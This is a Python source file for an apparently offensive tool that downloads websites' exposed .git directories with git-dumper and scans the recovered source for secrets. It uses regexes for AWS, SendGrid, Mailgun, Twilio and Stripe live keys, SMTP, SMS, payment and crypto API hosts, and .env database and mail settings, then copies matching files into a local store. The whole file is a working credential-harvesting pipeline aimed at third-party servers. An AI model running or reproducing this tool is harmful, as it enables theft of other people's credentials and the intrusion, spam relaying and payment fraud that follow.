# cython: language_level=3

import asyncio
import re
import shutil
import src.utils.generics.generic as generics
from config.params import ConfigApiConst
from pathlib import Path
import aiofiles


class VulnDumpProcess:
    def __init__(self):
        self.script_path = Path(__file__).parent.absolute()
        self.logger_git_manager = generics.setup_logging(
            logger_name=f"{ConfigApiConst.LoggingApiConfig.LOGGER_GIT_NAME}",
            log_file=ConfigApiConst.LoggingApiConfig.GIT_LOG_FILE_PATH,
        )
        self.compile_regex_patterns()
        self.logger_git_manager.debug("VulnDumpProcess Init")
        
        
        self.dump_folder = ConfigApiConst.CommonPathApiConfig.GIT_DUMP_NAME
        self.db_folder = ConfigApiConst.CommonPathApiConfig.GIT_DATABASE_NAME
        
        
        self.GIT_LOCATION = ["/.git", "/.git/HEAD", "/doc/.git/HEAD", "/core/.git/HEAD", "/blogs/.git/HEAD", "/bin/.git/HEAD", "/vendor/.git/HEAD"]

    async def run(self, url):
        try:
            self.logger_git_manager.debug(f"VulnDumpProcess url receipt: {url}")
            
            url_pour_le_mettre_dans_dump_et_dtb = self.format_url_for_dump(url)
            
            
            url_pour_mettre_dans_git_dumper = self.remove_head_suffix(url)
            
            dump_directory = self.create_directories(url_pour_le_mettre_dans_dump_et_dtb)
            
            if await self.safe_git_directory(dump_directory):
                is_dump_success = await self.simulate_git_dumper_command(
                    url_pour_mettre_dans_git_dumper, dump_directory
                )
                if is_dump_success:
                    await self.check_gitignore(dump_directory)
                    await self.search_and_copy_with_regex(
                            dump_directory,
                            self.script_path / f"{self.db_folder}/{url_pour_le_mettre_dans_dump_et_dtb}",
                        )
        except Exception as e:
            self.logger_git_manager.error(
                f"An error occurred with method run in VulnDumpProcess: {e}"
            )
        finally:
            #await self.delete_directory(dump_directory)
            self.logger_git_manager.debug(f"Directory was deleted: {dump_directory}")
            return
            
            
    def remove_head_suffix(self , string):
        suffix = '/HEAD'
        if string.endswith(suffix):
            return string[:-len(suffix)]
        return string

    async def check_gitignore(self, directory):
        if await self.run_subprocess(["git", "checkout", "."], cwd=directory):
            return True
        else:
            return False

    def should_skip_file(self, file_path, exclude_extensions):
        try:
            return (
                file_path.suffix.lower() in exclude_extensions
                or ".git" in file_path.parts
            )
        except Exception as e:
            self.logger_git_manager.error(
                f"should_skip_file / An error was occured for file : {file_path} / {e}"
            )

    async def delete_directory(self, dump_directory):
        if dump_directory.exists():
            await asyncio.get_event_loop().run_in_executor(
                None, shutil.rmtree, dump_directory, True
            )

    def format_url_for_dump(self, url):
        try:
            for suffix in self.GIT_LOCATION:
                if url.endswith(suffix):
                    return url[:-len(suffix)].replace("http://", "").replace("https://", "").replace("/" , "_")
            
            return url.replace("http://", "").replace("https://", "").replace("/" , "_")
        except Exception as e:
            self.logger_git_manager.error(
                f"remove_http_https / An error was occured for url : {url} / {e}"
            )

    def create_directories(self, url):
        try:
            output_directory = self.script_path / f"{self.dump_folder}/{url}"
            output_directory.mkdir(parents=True, exist_ok=True)
            return output_directory
        except Exception as e:
            self.logger_git_manager.error(
                f"create_directories / Failed to Create direcories for url : {url} / {e}"
            )
            
            
                
    async def run_subprocess(self, command, cwd=None):

        try:
            proc = await asyncio.create_subprocess_exec(
                *command,
                cwd=cwd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE,  # Pour envoyer des commandes au processus
            )

            try:
                # Attente avec un délai de 30 minutes (1800 secondes)
                await asyncio.wait_for(proc.wait(), timeout=1800)
            except asyncio.TimeoutError:
                self.logger_git_manager.error(f"Subprocess timeout with command: {command}")
                proc.kill()  # Terminer le processus
                await proc.wait()  # Attendre la fin du processus après l'avoir tué
                return False

            if proc.returncode != 0:
                self.logger_git_manager.error(f"Subprocess error with command: {command}, return code: {proc.returncode}")
                return False

            return True
        except Exception as e:
            self.logger_git_manager.error(f"Exception during subprocess execution with command: {command} / {e}")
            return False

    async def simulate_git_dumper_command(self, url, directory):
        # command = f"git-dumper {url} {directory}"
        command = f"git-dumper {url} {directory} --jobs 10 --retry 1 --timeout 15"
        return await self.run_subprocess(command.split(), cwd=directory)

    async def safe_git_directory(self, directory):
        unix_directory = str(directory).replace("\\", "/")
        return await self.run_subprocess(
            ["git", "config", "--global", "--add", "safe.directory", unix_directory]
        )

    def compile_regex_patterns(self):
        patterns = [
            r"AKIA[A-Z0-9]{16}",
            r"SG\.[\w_-]{16,32}\.[\w_-]{16,64}",
            r"(?i)(mailgun|mg)?(.{0,20})?key-[0-9a-z]{32}",
            r"(?:relay\-hosting\.secureserver\.net|express\-relay\.jangosmtp\.net|smtp\-relay\.(?:sendinblue|gamil)\.com)|smtp\.(?:exchange2019\.ionos\.fr|(?:broadband\.rogers|(?:postmarkapp|office365|hushmail|ntlworld|yandex|1and1|gmail|zoho|aol))\.com)|(?:s(?:mtp\.(?:sparkpost|(?:elastice|tipi))mail|ecure\.emailsrvr)\.com|(?:mail\.(?:btopenworld|smtp2go)|in\-v3\.mailjet)\.com|mail\.o2online\.de)|(?:smtp\.(?:deliverabilitymanager|ex1\.secureserver|sendgrid|verizon|orange)\.net|pro\.turbo\-smtp\.com|smtp\.(?:mailgun\.org|aruba\.it)|smtp\.comcast\.net|outbound\.att\.net)|email\-smtp\.(?:(?:(?:(?:(?:ap\-(?:southeast\-[12]|northeast\-[12])|eu\-west\-[1-3]|us\-west\-[12]|us\-east\-[12])|ap\-south\-1)|(?:us\-gov\-west|eu\-north|sa\-east)\-1)|eu\-central\-1)|ca\-central\-1)\.amazonaws\.com|(?:api\.(?:(?:sendinblue\.com|cc\.email)|smtp\.com)|mandrillapp\.com)|(?:presmtp\.ex3\.secureserver\.net|smtp(?:\.mxhichina|cloud\.sohu)\.com)",
            r"AC[a-z0-9]{32}",
            r"(?:platform\.clickatell|(?:eu\.api\.ovh|dualsms))\.com|api\.(?:(?:p(?:romotexter|livo)|smsfactor|bulksms|infobip|telnyx)\.com|clickatell\.com|txtlocal\.com|movider\.co|skebby\.it)|rest\.(?:gtx\-messaging\.net|(?:clicksend|nexmo)\.com)|sms(?:\.(?:capitolemobile\.com|lws\.fr)|panel\.aruba\.it)|nexmo_(?:secret|api|key)",
            r"(?i)stripe(.{0,20})?[sr]k_live_[0-9a-zA-Z]{24}|(?:sandbox\.powercash21\.com|(?:api(?:\.(?:(?:(?:paysafecard|mollie)|lyra)|klarna)|\-(?:na|oc)\.klarna)|open\-(?:sea|(?:eu|na))\.alipay|gateway\.ixopay|www\.(?:skrill|mypos))\.com|pay\.fondy\.eu)",
            r"api\.(?:blockchain|c(?:oinbase|rypto))\.com|(?:(?:stream\.crypto|bitpay)|www\.coinqvest)\.com|(?:www\.coinpayments\.net|uat\-(?:stream|api)\.3ona\.co)",
            r"APP_NAME=[^\s]+",
            r"DB_HOST=[^\s]+",
            r"MAIL_HOST=[^\s]+",
        ]

        self.regex_patterns = [re.compile(pattern) for pattern in patterns]

    async def search_and_copy_with_regex(self, directory, base_destination_directory):
        exclude_extensions = [
            ".jpg",
            ".jpeg",
            ".png",
            ".svg",
            ".git",
            ".css",
            ".gif",
            ".mp3",
            ".mp4",
            ".po",
            ".mo",
            ".pdf" ".woff",
            ".eot",
            ".gitignore",
            ".min.js"
        ]
        for file_path in Path(directory).rglob("*"):
            try:
                if self.should_skip_file(file_path, exclude_extensions):
                    continue
                await self.copy_file_if_matches_regex(
                    file_path, directory, base_destination_directory
                )
            except Exception as e:
                self.logger_git_manager.error(
                    f"search_and_copy_with_regex / An error was occured for directory : {directory} / {e} / Unknow Exceptions"
                )

    async def copy_file_if_matches_regex(
        self, file_path, directory, base_destination_directory
    ):
        if not file_path.is_file():
            return
        try:
           async with aiofiles.open(file_path, mode='r', encoding="utf-8", errors="ignore") as file:
                content = await file.read()
                for regex in self.regex_patterns:
                    if regex.search(content):
                        await self.copy_to_destination(
                            file_path, directory, base_destination_directory
                        )
                        break
        except PermissionError as e:
            self.logger_git_manager.error(
                f"copy_file_if_matches_regex  / An error was occured : {e} / PermissionError / with directory : {directory}"
            )
            return
        except Exception as e:
            self.logger_git_manager.error(
                f"copy_file_if_matches_regex / An error occured : {e} / Unknow Exceptions / with directory : {directory}"
            )
            return

    async def copy_to_destination(
        self, file_path, directory, base_destination_directory
    ):
        try:
            destination_path = base_destination_directory / file_path.relative_to(
                directory
            )
            destination_path.parent.mkdir(parents=True, exist_ok=True)
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, shutil.copy2, file_path, destination_path)
        except Exception as e:
            self.logger_git_manager.error(f"Error in copy_to_destination: {e}")
